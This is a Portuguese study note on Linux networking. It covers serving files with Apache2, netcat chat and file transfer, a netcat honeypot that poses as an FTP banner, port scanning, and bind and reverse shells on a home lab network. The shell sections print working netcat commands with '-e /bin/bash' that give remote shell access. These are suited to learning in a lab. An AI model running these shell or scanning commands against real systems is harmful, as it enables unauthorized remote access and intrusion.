# HTML PAGE

Vamos demonstrar como disponibilizar um serviço html no linux (máquina virtual) para acessarmos via windows (nativo).

Primeiramente, vamos identificar o conteúdo que queremos disponibilizar, no caso de demonstração queremos uma imagem de nome "teste.txt".

Além disso, precisaremos do apache2.

Instalação do serviço apache2:

```bash
sudo apt install apache2
```

## Comandos importantes do Apache2

para iniciar o serviço apache:

```bash
service apache2 start
```

Para interromper o serviço apache:

```bash
service apache2 stop
```

Para reiniciar um serviço apache:

```bash
service apache2 restart
```

Verificando o status do serviço

```bash
service apache2 status
● apache2.service - The Apache HTTP Server
     Loaded: loaded (/lib/systemd/system/apache2.service; enabled; vendor prese>
     Active: active (running) since Mon 2023-01-23 12:03:29 -03; 5min ago
       Docs: https://httpd.apache.org/docs/2.4/
   Main PID: 9510 (apache2)
      Tasks: 55 (limit: 4557)
     Memory: 4.9M
        CPU: 27ms
     CGroup: /system.slice/apache2.service
             ├─9510 /usr/sbin/apache2 -k start
             ├─9511 /usr/sbin/apache2 -k start
             └─9512 /usr/sbin/apache2 -k start

Jan 23 12:03:29 pop-os systemd[1]: Starting The Apache HTTP Server...
Jan 23 12:03:29 pop-os systemd[1]: Started The Apache HTTP Server.
```

## Localizando arquivos:

No meu caso, o arquivo estava na pasta de download, movi para o /var/www/html

```bash
mv Downloads/teste.txt /var/www/html/
```

```bash
ls /var/www/html/
index.html  luffy.jpg  Python.odt  teste.txt
```

obs: Com o arquivo no diretório, podemos iniciar o serviço apache. 

para iniciar o serviço apache:

```bash
service apache2 start
```

Agora podemos fazer download de todos os arquivos que estiverem no diretorio `/var/www/html/`

Utilizando o `ifconfig` conseguimos ver que o nosso ip local:

```bash
romio@pop-os:~$ ifconfig
enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.16  netmask 255.255.255.0  broadcast 192.168.0.255
```

A partir disso, podemos acessar o conteudo que disponibilizamos através de toda a rede local. 

No menu de url digitamos `192.168.0.16/teste.txt`

# Netcat

Podemos utilizar o netcat para abrirmos uma porta no nossa maquina.

O comando abaixo abre uma porta na maquina1:

```bash
nc -vlp 80
```

Na maquina2 estabelecemos a conexao:

```bash
nc 192.168.0.16 80
```

A partir de agora, o terminal de ambas as maquinas viram um "chat", vale destacar que a troca de mensagem não é criptografada e, consequentemente, alguém que estiver escutando a comunicação conseguiria visualizar as mensagens.

## Transferência de arquivo (TCP)

Por padrão, o netcat estabelece conexão via protocolo TCP. 

O nome do arquivo que queremos transferir é "arquivo.txt"

O comando abaixo abre uma porta na maquina de origem do arquivo:

```bash
nc -vlp 80 < arquivo.txt
```

Na maquina2 estabelecemos a conexao:

```bash
nc 192.168.0.16 80 > chegou.txt
```

obs: O nome do arquivo na maquina2 fica é arbitrário, podemos escolher qualquer nome.

A partir de agora, o arquivo "arquivo.txt" esta na máquina2 com o nome "salvo.txt"

Além disso, podemos acessar esse conteudo pelo URL do navegador `192.168.0.16`, no navegador da maquina2 nada acontece, mas na maquina1 recebemos a conexão com as seguintes informações:

```textile
Connection received on 192.168.0.10 51881
GET / HTTP/1.1
Host: 192.168.0.16
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Mon, 23 Jan 2023 15:03:27 GMT
If-None-Match: "29af-5f2efb39704e9-gzip"
```

Com isso, podemos identificar o navegador (User agent) e o sistema operacional (windows NT 10) da maquina 2]

Assim como disponibilizamos o arquivo .txt para transferencia usando o netcat, podemos utilizar o netcat para disponibilizar esse arquivo .txt em uma pagina html, acessando o ip através do menu URL e cancelando a conexão na máquina 1.

## Log

Podemos gerar registros das conexões estabelecidas com a maquina 1 e salvarmos dentro de um arquivo. 

Ao inves de digitarmos `nc -vlp 80 < arquivo.txt`  podemos optar por `nc -vlp 80 < arquivo.txt >> log` , com isso geramos registros dos acontecimentos.

### Honeypot

Podemos aperfeiçoar o nosso script,  para fazermos um Honeypot. Vamos utilizar o netcat para fingirmos um serviço FTP (porta 21). 

Para isso, vamos criar um arquivo de texto que exibirá uma mensagem a mensagem falsa 

```bash
nano 21.txt
```

No arquivo escrevemos a mensagem "220 ProFTPD 1.3.5rc3 Server (Ubuntu)!"

A partir disso, podemos falsificar um serviço FTP na porta 21 e capturar as conexões estabelicidas, colocando-as em um arquivo log

```bash
nc -vnlp 21 < 21.txt >> 21.log
```

O script acima ainda pode ser aperfeiçoado, vamos adicionar a hora em que a conexão ocorreu.

```bash
nc -vnlp 21 < 21.txt >> 21.log;echo $(date) >> 21.log
```

Além disso,  após concluida a conexão , o netcat fecha automaticamente essa conexão. É necessário garantir que o netcat esteja sempre disposto a receber conexões, por isso usamos o `while`.

```bash
while true;do nc -vnlp 21 < 21.txt >> 21.log;echo $(date) >> 21.log;done
```

### Problemas de Permissão

durante a execução do comando acima, há exigencia de permissão. O comando `sudo while true;nc -vnlp 21 < 21.txt >> 21.log;echo $(date) >> 21.log;done` não funciona, entende-se que o while é um argumento passado para o sudo. Para contornar esse problema podemos fazer de duas formas. 

1. `sudo su` e depois digitarmos o comando `while true;nc -vnlp 21 < 21.txt >> 21.log;echo $(date) >> 21.log;done`

2. `sudo bash -c 'while true;do nc -vnlp 21 < 21.txt >> 21.log;echo $(date) >> 21.log;done'`

A flag -c indica que é passado um script direto para a shell, então chamamos o bash com sudo e passamos para ele o programa.

## Port scanning

Podemos fazer Port Scanning com o netcat.

Podemos utilizar o comando abaixo para verificar se o host `192.168.0.16` esta com a porta 80 aberta.

```bash
nc -vnz 192.168.0.16 80
```

Podemos escolher um range de portas, no caso abaixo o scanning aconteceu entre as portas 70-90.

```bash
nc -vnz 192.168.0.16 70-90
(UNKNOWN) [192.168.0.16] 80 (http) open
```

# Bind shell e Reverse shell

## Bind Shell

Numa shell bind, um atacante precisa conectar-se ao computador de destino e executar comandos no computador alvo. Além disso, o alvo deve possuir uma porta aberta, a qual o atacante vai estabelecer a conexão. Para executar uma shell bind, o atacante deve ter o endereço IP da vítima para ter acesso ao computador alvo.

Para aplicarmos a técnica de bind shell devemos utilizar os seguintes passos:

1. Precisamos 'bindar' a shell à porta aberta do alvo, utilizando o Netcat.

2. Precisamos nos conetar a partir da máquina de ataque ao host alvo na porta previamente aberta.

3. Emitir comandos no host alvo a partir da máquina de ataque.

### Exemplo de Bind Shell

1. Precisamos 'bindar' a shell à porta aberta do alvo, utilizando o Netcat.
   
   ```bash
   nc -lvp 1337 -e /bin/bash
   ```
   
   Obs: A escolha da porta arbitrária, recomenda-se usar acima uma porta acima da 1024 para não escolhermos uma porta que precise de privilégios
   
   Para mais informações sobre portas -
   
   [unix - Why are ports below 1024 privileged? - Stack Overflow](https://stackoverflow.com/questions/10182798/why-are-ports-below-1024-privileged)

2. Precisamos nos conetar a partir da máquina de ataque ao host alvo na porta previamente aberta.
   
   ```bash
   nc 192.168.0.19 1337
   ```
   
   obs: O ip `192.168.0.19` é o ip local da máquina alvo, para descobrir o ip local utilizar o comando `ipconfig`
   
   A partir de agora é possivel utilizar comandos na máquina alvo a partir da máquina de ataque.

3. Emitir comandos no host alvo a partir da máquina de ataque.
   
   ```bash
   pwd 
   /home/kali
   ```

## Reverse Shell

Na reverse shell o atacante deve primeiro iniciar o servidor na sua máquina, enquanto a máquina alvo terá de agir como um cliente que se liga ao servidor fornecido pelo atacante. Após estabelecer a conexão, o atacante pode obter acesso à shell do computador alvo.

Para aplicarmos a técnica de reverse shell devemos utilizar os seguintes passos:

1. Setar a maquina de ataque como ouvinte via Netcat.

2. Conectar o host (alvo) ao ouvinte Netcat.

3. Emitir comandos sobre o host alvo a partir da máquina de ataque.

### Exemplo de Reverse Shell

1. Setar a maquina de ataque como ouvinte via Netcat

```bash
nc -lnvp 1337
```

obs: A escolha da porta arbitrária, recomenda-se usar acima uma porta acima da 1024 para não escolhermos uma porta que precise de privilégios

Para mais informações sobre portas -

[unix - Why are ports below 1024 privileged? - Stack Overflow](https://stackoverflow.com/questions/10182798/why-are-ports-below-1024-privileged)

2. Conectar o host (alvo) ao ouvinte Netcat.

```bash
nc 192.168.0.16 1337 -e /bin/bash
```

Obs: O ip `192.168.0.16` é o ip local da máquina atacante, para descobrir seu ip local utilizar o comando `ipconfig`

A partir de agora é possivel utilizar comandos na máquina alvo a partir da máquina de ataque.

```bash
pwd
/home/kali
```

## Estabelecendo conexão

Dentro os programas mencionados, existem muitos que podem realizar a mesma tarefa. Para realizar uma conexão e aplicar as técnicas de bind shell e reverse shell, temos:

1. /dev/tcp

2. netcat

3. socat

4. telnet

----



# Falta abordar

## Stdin, Sdtout e Stderr

## TCP e UDP

### Flags TCP



# Fontes:

Bind Shell e Reverse Shell - 

[Difference Between Bind Shell and Reverse Shell - GeeksforGeeks](https://www.geeksforgeeks.org/difference-between-bind-shell-and-reverse-shell/)

Portas abaixo de 1024 - 

[unix - Why are ports below 1024 privileged? - Stack Overflow](https://stackoverflow.com/questions/10182798/why-are-ports-below-1024-privileged)
